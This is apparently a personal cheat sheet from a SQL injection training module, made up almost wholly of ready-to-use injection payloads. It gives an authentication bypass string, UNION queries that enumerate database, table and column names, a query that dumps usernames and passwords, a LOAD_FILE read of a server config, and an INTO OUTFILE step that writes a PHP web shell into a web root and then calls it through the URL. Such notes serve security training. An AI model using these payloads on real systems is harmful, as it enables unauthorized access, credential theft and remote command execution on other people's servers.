
**IF NO SUCCESSS COMBINE WITH HTTB VERB TAMPERING**

![[Sql_Injection_Fundamentals_Module_Cheat_Sheet.pdf]]


**Bypassing Authentication:**
```shell-session
test' OR '1' = '1
```

**Gives database name, upon guessing number of columns:**
```shell-session
test') UNION SELECT 1, 2, 3, database() FROM INFORMATION_SCHEMA.SCHEMATA #
```

**Enumerates table names, in target database:**
```shell-session
test') UNION select 1 , 2 ,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema= 'DATABASE NAME'-- -
```

**Identify columns in table:**
```shell-session
test') UNION select 1 , 2 ,TABLE_NAME,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name= 'INSERT TABLE NAME'-- -
```

**Retrieve information from table:**
```shell-session
test') UNION select 1 , 2 ,Username,Password from INSERTTABLENAME -- -
```

**Find info such as root location:**
```shell-session
test') UNION SELECT 1, 2,LOAD_FILE("/etc/nginx/sites-enabled/default"), 4--  -
```

**Insert PHP Shell:**
```shell-session
youssef') union select "","",' *** ',"" into outfile '/var/www/chattr-prod/shell.php'-- --
```

**To run this command copy the contents of this screenshot where the three asterixis are:**
![[Pasted image 20260218154631.png]]

To then use the shell, edit the url where the command 'id' is.
